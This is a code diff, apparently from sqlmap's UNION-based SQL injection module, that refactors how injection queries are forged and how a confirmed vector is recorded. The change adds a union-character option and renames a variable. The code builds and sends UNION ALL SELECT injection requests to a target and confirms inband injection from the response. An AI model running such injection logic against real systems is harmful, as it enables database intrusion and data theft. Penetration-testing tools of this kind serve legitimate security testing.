@@ -32,14 +32,14 @@ def __unionPosition(comment, place, parameter, value, prefix, suffix, dbms, coun
     # For each column of the table (# of NULL) perform a request using
     # the UNION ALL SELECT statement to test it the target url is
     # affected by an exploitable inband SQL injection vulnerability
-    for exprPosition in range(0, count):
+    for position in range(0, count):
         # Prepare expression with delimiters
         randQuery = randomStr()
         randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
         randQueryUnescaped = unescaper.unescape(randQueryProcessed, dbms=dbms)
 
         # Forge the inband SQL injection request
-        query = agent.forgeInbandQuery(randQueryUnescaped, exprPosition, count=count, comment=comment, prefix=prefix, suffix=suffix)
+        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar)
         payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
 
         # Perform the request
@@ -47,7 +47,7 @@ def __unionPosition(comment, place, parameter, value, prefix, suffix, dbms, coun
 
         if resultPage and randQuery in resultPage and " UNION ALL SELECT " not in resultPage:
             validPayload = payload
-            vector = (exprPosition, count, comment, prefix, suffix, where)
+            vector = (position, count, comment, prefix, suffix, conf.uChar, where)
 
             if where == 1:
                 # Prepare expression with delimiters
@@ -56,14 +56,14 @@ def __unionPosition(comment, place, parameter, value, prefix, suffix, dbms, coun
                 randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2, dbms=dbms)
 
                 # Confirm that it is a full inband SQL injection
-                query = agent.forgeInbandQuery(randQueryUnescaped, exprPosition, count=count, comment=comment, prefix=prefix, suffix=suffix, multipleUnions=randQueryUnescaped2)
+                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2)
                 payload = agent.payload(place=place, parameter=parameter, newValue=query, where=2)
 
                 # Perform the request
                 resultPage, _ = Request.queryPage(payload, place=place, content=True)
 
                 if resultPage and (randQuery not in resultPage or randQuery2 not in resultPage):
-                    vector = (exprPosition, count, comment, prefix, suffix, 2)
+                    vector = (position, count, comment, prefix, suffix, conf.uChar, 2)
 
             break
 
